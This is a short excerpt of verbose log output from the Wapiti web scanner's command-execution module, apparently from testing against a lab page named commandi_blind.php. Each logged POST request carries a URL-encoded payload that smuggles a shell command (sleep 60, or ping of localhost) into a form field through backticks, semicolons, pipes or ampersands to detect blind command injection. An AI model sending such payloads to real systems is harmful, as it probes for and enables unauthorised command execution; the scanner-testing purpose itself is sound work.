+2024-03-20 16:36:05.378 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%60%29%60&form=submit
+2024-03-20 16:36:05.400 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%60sleep%2060%60&form=submit
+2024-03-20 16:37:05.432 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%3Bsleep%2060%3B&form=submit
+2024-03-20 16:38:05.473 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%7Csleep%2060%3B&form=submit
+2024-03-20 16:39:05.493 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%26ping%20-n%2025%20127.0.0.1%26&form=submit
